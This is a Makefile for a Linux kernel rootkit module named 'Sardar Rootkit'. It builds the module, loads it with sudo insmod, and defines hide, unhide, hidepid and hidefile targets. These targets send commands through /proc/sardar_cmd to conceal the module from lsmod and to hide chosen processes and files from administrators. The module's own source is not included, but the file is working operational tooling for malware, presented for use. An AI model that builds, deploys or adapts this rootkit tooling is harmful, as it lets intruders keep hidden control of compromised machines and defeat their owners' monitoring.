obj-m += sardar_rootkit.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

# Default target - builds kernel module
all: module

# Build the kernel module
module:
	@echo "Building Sardar Rootkit kernel module..."
	@$(MAKE) -C $(KDIR) M=$(PWD) modules
	@echo "Build complete."

# Clean build artifacts
clean:
	@echo "Cleaning build files..."
	@$(MAKE) -C $(KDIR) M=$(PWD) clean
	@rm -f *.ko.unsigned *.mod *.o.ur-safe
	@echo "Clean complete."

# Install the module (requires root/sudo)
install:
	@echo "Installing kernel module..."
	@-sudo rmmod sardar_rootkit 2>/dev/null || true
	@sudo insmod ./sardar_rootkit.ko
	@lsmod | grep sardar
	@echo "Installation complete."

# Remove the module (requires root/sudo)
uninstall:
	@echo "Removing kernel module..."
	@-sudo rmmod sardar_rootkit 2>/dev/null || true
	@echo "Removal complete."

# Hide the module from lsmod (requires root/sudo)
hide:
	@echo "Hiding module from lsmod..."
	@sudo bash -c 'echo "HIDE" > /proc/sardar_cmd'
	@echo "Module hidden."

# Unhide the module (requires root/sudo)
unhide:
	@echo "Unhiding module..."
	@sudo bash -c 'echo "UNHIDE" > /proc/sardar_cmd'
	@echo "Module unhidden."

# Hide a process by PID (requires root/sudo)
hidepid:
	@echo "Usage: make hidepid PID=<process_id>"
	@sudo bash -c 'echo "HIDEPID $(PID)" > /proc/sardar_cmd'
	@echo "Process $(PID) hidden."

# Hide a file (requires root/sudo)
hidefile:
	@echo "Usage: make hidefile FILE=<filename>"
	@sudo bash -c 'echo "HIDEFILE $(FILE)" > /proc/sardar_cmd'
	@echo "File $(FILE) hidden."

# Target for debugging
debug:
	@echo "Building with debug symbols..."
	@KCFLAGS="-DDEBUG -g" $(MAKE) -C $(KDIR) M=$(PWD) modules
	@echo "Debug build complete."

# Help target
help:
	@echo "Sardar Rootkit Makefile"
	@echo "Available targets:"
	@echo "  all       - Build kernel module (default)"
	@echo "  clean     - Remove build artifacts"
	@echo "  install   - Install module (requires root)"
	@echo "  uninstall - Remove module (requires root)"
	@echo "  hide      - Hide module from lsmod"
	@echo "  unhide    - Unhide module"
	@echo "  hidepid   - Hide process by PID (use with PID=<number>)"
	@echo "  hidefile  - Hide file (use with FILE=<path>)"
	@echo "  debug     - Build with debug symbols"

.PHONY: all clean install uninstall hide unhide hidepid hidefile debug help
